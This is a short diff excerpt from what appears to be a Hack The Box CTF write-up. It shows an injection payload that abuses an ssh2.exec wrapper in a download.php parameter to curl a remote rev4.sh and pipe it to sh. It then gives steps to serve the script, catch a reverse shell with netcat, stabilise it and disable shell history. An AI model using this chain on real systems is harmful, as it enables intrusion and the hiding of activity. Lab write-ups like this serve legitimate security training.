@@ -44,4 +44,11 @@ So the whole payload is:
 http://xxxx.xxx.htb/download.php?id=3324&show=true&format=ssh2.exec://xxxx:xxxxx@127.0.0.1/curl+-s+http://10.10.xx.xx/rev4.sh|sh;
 
 
+(You need to open a python3 -m http.server at your rev.sh directory, and then a nc -lvnp port or rlwrap nc -lvnp port)
+and then stabilize the shell with:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+export SHELL=bash
+export HISTFILE=/dev/null
+
 2. 
